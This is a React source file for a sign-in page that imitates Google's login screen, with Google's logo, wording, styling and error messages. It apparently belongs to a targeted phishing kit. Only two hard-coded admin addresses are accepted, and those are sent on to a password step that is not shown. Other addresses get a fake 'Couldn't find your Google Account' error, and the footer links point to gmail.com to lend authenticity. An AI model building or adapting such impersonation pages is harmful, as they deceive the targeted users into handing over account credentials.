import React, { useState, useEffect, useRef } from 'react';

interface SignInPageProps {
  onNavigate: (page: string, data?: { email?: string }) => void;
}

const VALID_EMAILS = ['admin@linodegpu.com', 'admin@linkerdm.online'];

const GoogleGLogoLarge: React.FC = () => (
  <svg width="48" height="48" viewBox="0 0 48 48">
    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
  </svg>
);

export const SignInPage: React.FC<SignInPageProps> = ({ onNavigate }) => {
  const [email, setEmail] = useState('');
  const [isFocused, setIsFocused] = useState(true);
  const [error, setError] = useState('');
  const inputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    inputRef.current?.focus();
  }, []);

  const handleNext = () => {
    if (!email) {
      setError('Enter an email or phone number');
      return;
    }

    const isValidEmail = VALID_EMAILS.some(
      (validEmail) => validEmail.toLowerCase() === email.toLowerCase()
    );

    if (!isValidEmail) {
      setError("Couldn't find your Google Account");
      return;
    }

    setError('');
    onNavigate('auth-password', { email });
  };

  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter') {
      handleNext();
    }
  };

  const showFloatingLabel = isFocused || email.length > 0;

  return (
    <div className="min-h-screen bg-[#f0f4f9] flex flex-col">
      {/* Main content */}
      <div className="flex-1 flex items-center justify-center p-[16px]">
        <div className="bg-white rounded-[8px] shadow-[0_1px_3px_0_rgba(60,64,67,0.3),0_4px_8px_3px_rgba(60,64,67,0.15)] w-full max-w-[840px] min-h-[500px] p-[48px] flex">
          {/* Left side */}
          <div className="flex-1 flex flex-col pr-[40px]">
            <GoogleGLogoLarge />
            <h1 className="text-[44px] font-normal text-[#202124] mt-[16px] mb-[4px] leading-[52px]">Sign in</h1>
            <p className="text-[16px] text-[#202124]">Use your Google Account</p>
          </div>

          {/* Right side */}
          <div className="flex-1 flex flex-col justify-center pl-[40px]">
            {/* Email input - Material Design outlined style */}
            <div className="relative mb-[8px]">
              <div
                className={`relative rounded-[4px] transition-all ${
                  error
                    ? 'border-[2px] border-[#d93025]'
                    : isFocused
                    ? 'border-[2px] border-[#1a73e8]'
                    : 'border border-[#dadce0]'
                }`}
              >
                {showFloatingLabel && (
                  <label
                    className={`absolute left-[12px] px-[4px] bg-white text-[12px] ${
                      error
                        ? 'text-[#d93025]'
                        : isFocused
                        ? 'text-[#1a73e8]'
                        : 'text-[#5f6368]'
                    }`}
                    style={{ top: '-9px' }}
                  >
                    Email or phone
                  </label>
                )}
                <input
                  ref={inputRef}
                  type="text"
                  value={email}
                  onChange={(e) => { setEmail(e.target.value); setError(''); }}
                  onFocus={() => setIsFocused(true)}
                  onBlur={() => setIsFocused(false)}
                  onKeyDown={handleKeyDown}
                  placeholder={!showFloatingLabel ? 'Email or phone' : ''}
                  className={`w-full px-[15px] text-[16px] text-[#202124] outline-none rounded-[4px] bg-transparent placeholder:text-[#5f6368] ${
                    isFocused || error ? 'h-[54px]' : 'h-[56px]'
                  }`}
                />
              </div>
              {error && (
                <div className="flex items-center gap-[8px] mt-[8px]">
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="#d93025">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                  </svg>
                  <span className="text-[12px] text-[#d93025]">{error}</span>
                </div>
              )}
            </div>

            {/* Forgot email link */}
            <button className="text-[14px] text-[#1a73e8] font-medium hover:bg-[#f6fafe] text-left w-fit px-[6px] py-[4px] -ml-[6px] rounded-[4px]">
              Forgot email?
            </button>

            {/* Guest mode info */}
            <p className="text-[14px] text-[#5f6368] mt-[24px] leading-[20px]">
              Not your computer? Use Guest mode to sign in privately.{' '}
              <button className="text-[14px] text-[#1a73e8] font-medium hover:underline">
                Learn more about using Guest mode
              </button>
            </p>

            {/* Buttons */}
            <div className="flex items-center justify-between mt-[32px]">
              <button className="text-[14px] text-[#1a73e8] font-medium hover:bg-[#f6fafe] px-[8px] py-[9px] rounded-[4px] transition-colors -ml-[8px]">
                Create account
              </button>
              <button
                onClick={handleNext}
                className="h-[36px] px-[24px] bg-[#1a73e8] text-white text-[14px] font-medium rounded-[20px] hover:bg-[#1765cc] hover:shadow-[0_1px_2px_0_rgba(60,64,67,0.3),0_1px_3px_1px_rgba(60,64,67,0.15)] transition-all"
              >
                Next
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="py-[16px] px-[40px]">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-[16px]">
          <div className="flex items-center">
            <button className="text-[12px] text-[#5f6368] hover:text-[#202124] flex items-center gap-[4px]">
              English (United Kingdom)
              <svg width="10" height="10" viewBox="0 0 24 24" fill="currentColor">
                <path d="M7 10l5 5 5-5z" />
              </svg>
            </button>
          </div>
          <div className="flex items-center gap-[32px]">
            <a href="https://gmail.com" target="_blank" rel="noopener noreferrer" className="text-[12px] text-[#5f6368] hover:text-[#202124]">Help</a>
            <a href="https://gmail.com" target="_blank" rel="noopener noreferrer" className="text-[12px] text-[#5f6368] hover:text-[#202124]">Privacy</a>
            <a href="https://gmail.com" target="_blank" rel="noopener noreferrer" className="text-[12px] text-[#5f6368] hover:text-[#202124]">Terms</a>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default SignInPage;
